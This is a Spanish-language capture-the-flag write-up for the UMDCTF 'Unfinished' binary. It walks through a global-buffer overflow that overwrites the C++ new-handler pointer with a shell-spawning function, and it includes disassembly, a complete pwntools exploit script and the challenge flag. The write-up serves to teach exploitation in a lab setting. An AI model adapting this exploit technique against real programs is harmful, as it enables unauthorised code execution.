## Analisis

El binario dado es un ELF de 64 bits, escrito en C++

El codigo fuente
```C++
#include <cstdio>
#include <cstdlib>

char number[128];

void sigma_mode() {
    system("/bin/sh");
}

int main() {
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);

    printf("What size allocation?\n");
    fgets(number, 500, stdin);

    long n = atol(number);
    int *chunk = new int[n];
    // TODO: finish the heap chal
}
```


El programa toma nuestra entrada y asigna memoria dinamicamente para un array de ints de la extension que queramos.

Esto es un clasico ret2win porque ya tenemos una funcion (`sigma_mode`) que invoca una shell, solo tenemos que invocarla de alguna manera.

Tenemos una entrada para escribir en `number` 500 bytes pero `number` es un arreglo de solo 128 bytes, hay un buffer overflow aqui.

Ahora bien, tiene las siguientes propiedades:
```
[*] '/home/kalcast/Descargas/Unfinished/unfinished'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```

No tiene `PIE` asi que las direcciones de memoria son fijas

Aunque tiene canario habilitado hay un buffer overflow de todas maneras porque `number` es una variable local, se almacena fuera del stack y el `check_stack_fail` solo ocurre si el canario, que esta en el stack, se corrompe.

## Explotacion

Analicemos la direccion donde esta almacenado `number`:
```
[0x0041f060]> s obj.number
[0x0041f060]> ? obj.number + 500
int32   4321876
uint32  4321876
hex     0x41f254
```

Podemos sobreescribir cualquier cosa en el rango 0x41f060 --  0x41f254

Buscamos algo en ese rango y lo unico que tenemos es esto:
```
[0x0041f060]> afl~0x0041f
0x0041f120    1   3808 method.__gnu_cxx.__verbose_terminate_handler__::terminating
[0x0041f060]> s method.__gnu_cxx.__verbose_terminate_handler__::terminating
[0x0041f120]> pd 24
            ;-- __gnu_cxx::__verbose_terminate_handler()::terminating:
            ; DATA XREFS from __gnu_cxx::__verbose_terminate_handler() @ 0x403560(r), 0x40356d(w) ; method.__gnu_cxx.__verbose_terminate_handler__
/ 3808: method.__gnu_cxx.__verbose_terminate_handler__::terminating ();
; __gnu_cxx::__verbose_terminate_handler()::terminating
|           0x0041f120      0000           add byte [rax], al
|           0x0041f122      0000           add byte [rax], al
|           0x0041f124      0000           add byte [rax], al
|           0x0041f126      0000           add byte [rax], al
|           ;-- (anonymous namespace)::__new_handler:
|           ; DATA XREF from std::get_new_handler() @ 0x4105e4(r)
|           0x0041f128      0000           add byte [rax], al          ; (anonymous namespace)::__new_handler
|           0x0041f12a      0000           add byte [rax], al
|           0x0041f12c      0000           add byte [rax], al
|           0x0041f12e      0000           add byte [rax], al
|           ;-- once_regsizes.0:
```

Buscando informacion encontramos que `std::__new_handler` es un puntero a funcion que usan los metodos `std::set_new_handler` y  `std::get_new_handler()` y en su documentacion encontramos algo interesante:

![2025-04-27-191209_854x132_scrot](https://github.com/user-attachments/assets/66db19ac-0bf2-43f9-bff5-193e5c9cef8d)

![2025-04-27-191408_818x37_scrot](https://github.com/user-attachments/assets/d469297a-65dd-4323-857e-7f70205cbefc)

Esta funcion es llamada cuando una funcion de asignacion de memoria cuando falla algun intento de esto, por ejemplo `new`

Lo que debemos hacer es sobreescribir este puntero a funcion con la direccion de `sigma_mode` y luego forzar un error al asignar memoria con `new int[n]` 

Cuando n es un numero muy grande se produce el error `std::bad_alloc` pero si el numero es muy grande se produce el error `std::bad_array_new_length` y se termina la ejecucion sin llamar al handler:

```
|           0x00401a54      48bafeffff..   movabs rdx, 0x1ffffffffffffffe ; 2305843009213693950
|           0x00401a5e      4839c2         cmp rdx, rax
|       ,=< 0x00401a61      7206           jb 0x401a69
|       |   0x00401a63      48c1e002       shl rax, 2
|      ,==< 0x00401a67      eb05           jmp 0x401a6e
|      |`-> 0x00401a69      e882f6ffff     call sym.__cxa_throw_bad_array_new_length
```

Necesitamos usar un numero grande pero menor que 0x1ffffffffffffffe para causar el error que necesitamos y que se invoque al handler

Exploit:
``` python
from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

#p = process("./unfinished")
p = remote("challs.umdctf.io",31003)
elf = context.binary = ELF("./unfinished")

#gdb.attach(p, gdbscript='''
#    x/40wx 0x0041f120  # Ver zona de handlers
#    break *sigma_mode  # Parar antes de ejecutar la shell
#    continue
#''')

input_start = 0x0041f060
target_addr = 0x0041f128
sigma_mode = 0x004019b6

# Calcular el offset
offset = target_addr - input_start

payload = b"1844674407370955161"  # Desencadenar bad_alloc
payload += b"\x00" * (offset - len(payload))
payload += p64(sigma_mode)

print(f"Payload: {payload} len:{len(payload)}")

p.sendline(payload)
p.interactive()
```

`UMDCTF{crap_i_have_to_come_up_with_a_flag_too?????????}`
